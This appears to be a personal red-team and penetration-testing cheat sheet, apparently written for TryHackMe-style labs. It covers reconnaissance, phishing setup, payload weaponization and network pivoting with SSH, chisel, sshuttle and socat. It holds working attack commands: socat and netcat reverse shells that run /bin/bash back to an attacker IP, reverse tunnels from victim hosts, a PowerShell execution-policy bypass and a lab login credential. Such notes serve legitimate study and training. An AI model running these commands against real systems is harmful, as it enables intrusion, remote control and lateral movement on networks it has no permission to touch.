- [Basic Steps](#basic-steps)
  - [Active](#active)
- [External Tools](#external-tools)
- [Phishing](#phishing)
- [Passive](#passive)
  - [recon-ng](#recon-ng)
  - [Weaponization](#weaponization)
- [PIVOTING](#pivoting)
  - [SSH](#ssh)
  - [SS](#ss)
  - [PLINK.EXE](#plinkexe)
  - [CHISEL](#chisel)
  - [SSHUTTLE](#sshuttle)
  - [PROXY](#proxy)
  - [SOCAT](#socat)
- [Wireshark](#wireshark)


## Basic Steps
- Enumerate
- Find everything that there is outside and inside
  -  Number of machines
  - services running
  - Publici interface?
  - git server ?
  - public IP
    - arp
- find services running, find cve for these services
- stablish stable connection (pivoting): reverse shell, proxy, ssh, port forwarding, socat, sshuttle
- get ssh key if they are available
- upload/download files
- No dns if web: add to etc/hosts

### Active
- interacting
- https://www.rapid7.com/db/
- searchsploit

## External Tools
- enum4linux IP_
- metasploit (smb/enum || ssh/enum)
- gobuster / ffuf
- lienum (linux): 
  - the file must be executed in the target
  - search for readble important files
- executables (SUID): find / -perm -u=s -type f 2>/dev/null 
- How to abuse of each executable: https://gtfobins.github.io/gtfobins/vim/

- PowerSploit (windows)
  - in the target 

## Phishing
- Steps
  - register domain name
  - ssl/tsl certificated
  - email server/account
  - Dns records
  - web server
  
- emlAnalyzer
  - --header
  - -u
  - --text
  - --extract-all

- GoPhish
  - manage phishing campaings

- Droppers
  - poison, downloaded file

## Passive
- whois
- nslookup -type=?? URL SERVER
- dig SERVER URL TYPE
- host
- Google Hacking Database
  - [intitle:"index of" "nginx.log"](https://www.exploit-db.com/google-hacking-database)
  - 
- Google
  - blabla site:
  - filetype:pdf  inurl:www.google.de
  - site:hs-worms.de filetype:docx
  - *intitle:index.of site:*
  - *intitle:login*
  - cache:url
  - https://web.dev/measure/
  - robots.txt

- Maltego
  - graphical

- DNS:
  - shodan.io [check black friday - https://www.shodan.io/]
  - https://viewdns.info/
  - https://threatintelligenceplatform.com/

### recon-ng
- Workspace:
  - workspace create NAME
  - db schmea = check database
- marketplace search MODULE
  - info, install, remove MODULE
- Modules
  - module search/load  
  - options list/set/unset

### Weaponization
- Developing malicious code
- https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
- VBE
- HTA - Html application
- windows reverse shell
  - get-executionpolicy = for ps1 files
  - set-executionpolicy -Scote Currentuser remotesigned
  - powershell -ex bypass -File name.ps1

## PIVOTING
-  from on machine to another
-  tunnelling/proxying: route all traffic (a lot of traffic)
-  port forwarding: create connection (few ports)
-  ProxyChain
- (linux) firewall-cmd --zone=public --add-port PORT/tcp
- (windows) netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT

### SSH
[Port Forwarding](https://notes.benheater.com/books/network-pivoting)

```
# sshd_config
# config for specific user
Match junkuser
    PermitRootLogin no
    PermitTTY no
    PermitUserRC no
    ForceCommand "echo 'This account is for port forwarding only'"
    PasswordAuthentication yes
    PermitEmptyPasswords no
    MaxAuthTries 2   
    AllowAgentForwarding no
    X11Forwarding no
	X11UseLocalhost no
```

- Port Forwarding
  - ssh -L [myport]:target:[open_port_target] user@[public_ip] -fN
- Proxy
  - ssh -D PORT user@[public_ip] -fN
- create key pair on the attacking machine
- transfer private key to victim
- stablish connection from victim to attacking
  - ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - executing on we habe the shell

- -L ==> Port FOrwarding
  - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
  - access FIRST through SECOND, 8000 is local port
    - -f = background
    - -N no command execution

- -D [PORT] ==> Proxy
  - open port on attacking
-Reverse Connections
  - generate ssh key
  - put .pub in authorized: command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-x11-forwading,no-pty ssh-rsa key
  - restart ssh
  - transfer private key to target: 
  - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN

### SS
- tool to investigate sockets
- -t: tcp sockets
- -u: udp sockets
- -l: listening
- -p: show process
- -n: dont resolve 

### PLINK.EXE
- command line for putty
- cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
- convert key with puttygen: puttygen key -o xxx.ppk

### CHISEL
- set up tunnel proxy / port forward
  
- client / server 
  
- Reverse SOCKS Proxy
  - server: chisel server -p [port] --reverse &
  - client (victim0): ./chisel client [attacker]:8005 R:socks &
    - R = remote, client knows that server antecipate proxy
- 
- Forward SOCK Proxy
  - victim: ./chisel server -p LISTEN_PORT --socks5
  - attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
  
- Port Forward
  - attacker: ./chisel server -p LISTEN_PORT --reverse &
  - victim to target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
  - victim to our machine: ./chisel server -p 1337 --reverse &
  
- Local Port Forward
  - compromised: ./chisel server -p LISTEN_PORT
  - attacker: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

- In the machine with evil-win open firewall port
  - cd w
  - chisel client => attacking
  - chisel server => victim

### SSHUTTLE
- easier to handle
- only linzx
- need ssh access to public interface
- sshuttle -r username@address subnet  
  - -N to guess the subnet
- No password:
  - sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
  - -x exclude compromised server
- Direct access to evil-winrM
  - evil-winrm -u pacoca -p 123456 -i 10.200.101.150
-Reset resolved.service: sudo systemctl restart systemd-resolved.service


### PROXY
- proxychains
  - open port in our system linked to target
  - proxychains COMMAND [host] [port] / own conf file proxychains.conf
    - comment proxy_dns ==> cause nmap to crash
    - no Ping (-Pn) only TCP, no UDP/SYN
  
- FoxyProxy
  - better for web

### SOCAT
- Reverse shell
  - listener on the attacker
  - relay on compromised: ./socat tcp-l:8000 tcp:Attacker-IP:443 &
  - create reverse shell from compromised to attacker: nc localhost 8000 -e/bin/bash

- Port Forwarding - Method 1
  - open port on victim + redirect to target server = ./socat tcp-l:[port_on_victim],fork,reuseaddr tcp:[target_ip]:3306 &

- Method 2 -Quieter - read more about that https://tryhackme.com/room/wreath: 
  - Attacker, opens to ports: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
  - victim: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
- on victim: ./socat tcp-l:8000 tcp:10.50.102.138:443 & => connect victim back to us on port 443
- on victim: ./nc 127.0.0.1 8000 -e /bin/bash ==> listen to port 8000 
- Port Forwarding [From_Compromised_to_TARGET]: ./socat tcp-l:[port_on_compromised],fork,reuseaddr tcp:[IP_Target]:3306 &

- Encrypted:
  - Create key + Litener + Connect
  - Create certificate: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
  - merge keys: cat shell.key shell.crt > shell.pem
  - listener: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
  - connect back: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 close all:
  - jobs ==> find socats processes 

- Steps:
```
# Create key
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

# req = certificate
# -x509 = type of certificate
# -newkey rsa:4096 = type of key with size
# -days = valid
# -subj = organization, country
# -nodes = NOT encrypt private key
# -keyout PRIVATE = file with the private key
# -out Certificate = file to write certificate

# PEM = privace enhanced mail = concat .key + .cert
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem.

# Start listener
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

# Connect
socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash

# Without encryption
  # Listener # socat -d -d TCP-LISTEN:4443,fork STDOUT
  # Victim   # socat TCP:10.20.30.129:4443 EXEC:/bin/bash

  ```

## Wireshark
- statistical of
  - protocol
  - ip
  - ports
  - services
- watch out
  - addreses in user
  - suspicious address
  - suspecious port
  - services in user
  - level of traffic
- Check queries
  - dns
  - http